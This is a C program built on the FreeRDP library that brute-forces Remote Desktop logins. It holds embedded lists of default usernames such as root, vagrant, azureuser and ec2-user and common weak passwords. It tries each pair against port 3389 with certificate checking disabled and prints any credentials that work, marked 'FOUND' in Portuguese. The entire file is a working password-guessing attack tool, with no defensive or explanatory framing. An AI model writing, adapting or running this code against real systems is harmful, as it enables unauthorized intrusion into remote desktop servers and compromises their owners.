#include <freerdp/freerdp.h>
#include <stdio.h>
const char users[]=
    "admin\n"
    "admin123\n"
    "root\n"
    "administrator\n"
    "ftp\n"
    "test\n"
    "guest\n"
    "adm\n"
    "user\n"
    "oracle\n"
    "vagrant\n"
    "azureuser\n"
    "pi\n"
    "ec2-user\n"
    "ansible\n"
    "info\n"
    "password\n";
const char passwords[]=
    "root\n"
    "admin\n"
    "123456\n"
    "password\n"
    "12345678\n"
    "qwerty\n"
    "123456789\n"
    "12345\n"
    "1234\n"
    "111111\n"
    "1234567\n"
    "dragon\n"
    "fuckyou\n"
    "123qwe\n"
    "buster\n"
    "superman\n"
    "freedom\n"
    "asshole\n"
    "batman\n";
int connectrdp(char ip[],char user[],char pwd[]){
    int result = 0;
    wLog *wroot = WLog_GetRoot();
    WLog_SetStringLogLevel(wroot,"OFF");
    freerdp *rdp = freerdp_new();
    if(rdp==NULL || freerdp_context_new(rdp)==FALSE){
        freerdp_free(rdp);
        return -1;
    }
    char domain[20];
    memset(domain,0,sizeof(domain));
    rdp->settings->Username=user;
    rdp->settings->Password=pwd;
    rdp->settings->IgnoreCertificate=TRUE;
    rdp->settings->AuthenticationOnly=TRUE;
    rdp->settings->ServerHostname=ip;
    rdp->settings->Domain = domain;
    rdp->settings->ServerPort = 3389;
    rdp->settings->TcpConnectTimeout = 5;
    freerdp_connect(rdp);
    result = freerdp_get_last_error(rdp->context);
    freerdp_disconnect(rdp);
    freerdp_free(rdp);
    switch (result)
    {
    case 0:
        result = 1;
        break;
    case 0x00020009:
    case 0x00020014:
    case 0x00020015:
        result = 0;
        break;
    default:
        result = -1;
        break;
    }
    return result;
}
void rdpbrute(char ip[]){
    int i = 0,y=0,x=0,z=0;
        while (1){
            char tmpu[100]={},tmpp[100]={};
            int leave = 0;
            while(users[i] != '\n'){
                tmpu[z] = users[i];
                ++i;++z;
            }
            z=0;++i;
            if(users[i]=='\0')
                leave=1;
            while (1){
                int ll=0;
                while (passwords[y] !='\n'){
                    tmpp[x]=passwords[y];
                    ++x;++y;
                }
                ++y;x=0;
                if(passwords[y] == '\0')
                    ll=1;
                int a = connectrdp(ip,tmpu,tmpp);
                if(a == -1) return;
                else if(a){
                    printf("usuario:%s senha:%s FOUND\n",tmpu,tmpp);
                    return;
                }
                memset(tmpp,0,sizeof(tmpp));
                if(ll){
                    y=0;
                    break;
                }
            }
            memset(tmpu,0,sizeof(tmpu));
            if(leave)
                break;
        }
}
int main(int argc, char *argv[]){
    rdpbrute("127.0.0.1");
}